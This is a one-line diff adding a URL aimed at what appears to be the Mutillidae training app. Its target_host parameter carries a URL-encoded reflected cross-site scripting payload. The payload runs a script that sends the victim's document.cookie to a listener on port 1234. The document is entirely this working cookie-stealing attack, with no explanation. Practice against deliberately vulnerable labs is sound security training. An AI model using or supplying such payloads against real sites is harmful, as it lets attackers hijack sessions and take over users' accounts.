@@ -1,0 +1,1 @@
+http://mutillidae.local/index.php?page=dns-lookup.php&target_host=%3Cscript%3Enew%20Image%28%29.src%3D%22http%3A%2F%2Fmutillidae.local%3A1234%2F%3Fc%3D%22%2BencodeURIComponent%28document.cookie%29%3B%3C%2Fscript%3E
